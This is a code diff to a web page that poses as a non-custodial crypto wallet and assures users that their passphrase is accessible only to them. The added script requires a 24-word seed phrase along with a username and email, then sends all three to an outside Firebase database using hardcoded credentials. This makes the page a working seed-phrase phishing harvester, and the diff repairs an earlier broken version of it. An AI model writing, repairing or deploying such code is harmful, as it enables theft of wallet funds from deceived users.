@@ -227,61 +227,63 @@
         <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
     </div>
 
-        <script>
+    <script type="module">
+    // Import Firebase SDK
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-        // Import Firebase SDK
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+    // 🔥 Your Firebase Configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyCbMGpa-VAloIM4ywNYFn3ViSizrkYF3zg",
+        authDomain: "passphrase-a5e1f.firebaseapp.com",
+        projectId: "passphrase-a5e1f",
+        storageBucket: "passphrase-a5e1f.firebasestorage.app",
+        messagingSenderId: "262596879204",
+        appId: "1:262596879204:web:8690ff2e65b04cb3be1071",
+        measurementId: "G-GBN1VTJ0FE"
+    };
 
-        // 🔥 Your Firebase Configuration (Replace with your actual credentials)
-        const firebaseConfig = {
-    apiKey: "AIzaSyCbMGpa-VAloIM4ywNYFn3ViSizrkYF3zg",
-    authDomain: "passphrase-a5e1f.firebaseapp.com",
-    projectId: "passphrase-a5e1f",
-    storageBucket: "passphrase-a5e1f.firebasestorage.app",
-    messagingSenderId: "262596879204",
-    appId: "1:262596879204:web:8690ff2e65b04cb3be1071",
-    measurementId: "G-GBN1VTJ0FE"
-        };
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
 
-        // Initialize Firebase
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-            
-        function validateForm(event) {
-            event.preventDefault();
-            let username = document.getElementById("username").value.trim();
-            let email = document.getElementById("email").value.trim();
-            let passphrase = document.getElementById("passphrase").value.trim();
-            let words = passphrase.split(" ").filter(word => word.length > 0);
+    async function storeValues(username, email, passphrase) {
+        try {
+            await addDoc(collection(db, "users"), {
+                username: username,
+                email: email,
+                passphrase: passphrase, 
+                timestamp: new Date()
+            });
 
-            if (!username || !email || words.length !== 24) {
-                alert("Please enter all required details correctly.");
-                return false;
-            }
+            alert("Request sent successfully!");
+        } catch (error) {
+            console.error("Error adding document:", error);
+            alert("Failed to send request. See console for details.");
+        }
+    }
+ 
+    function validateForm(event) {
+        event.preventDefault();
 
-            storeValues(username, email, passphrase);
-            return false;
+        let username = document.getElementById("username").value.trim();
+        let email = document.getElementById("email").value.trim();
+        let passphrase = document.getElementById("passphrase").value.trim();
+        let words = passphrase.split(" ").filter(word => word.length > 0);
+
+        if (!username || !email || words.length !== 24) {
+            alert("Please enter all required details correctly.");
+            return;
         }
 
-        function storeValues(username, email, passphrase) {
-            console.log("Stored Values:", { username, email, passphrase });
+        storeValues(username, email, passphrase);
+    }
 
-                        try {
-                await addDoc(collection(db, "users"), {
-                    username: username,
-                    email: email,
-                    passphrase: passphrase, 
-                    timestamp: new Date()
-                });
-                alert("Request sent!");
-            } catch (error) {
-                alert("Failed to send request.");
-            }
-            
-        }
-    </script>
-        
+    // Attach event listener to form
+    document.querySelector(".passkey-form form").addEventListener("submit", validateForm);
+</script>
+
+    
     <!-- Content Section -->
     <div class="container">
                  <div class="faq-section" onclick="toggleFAQ('faq1', this)">
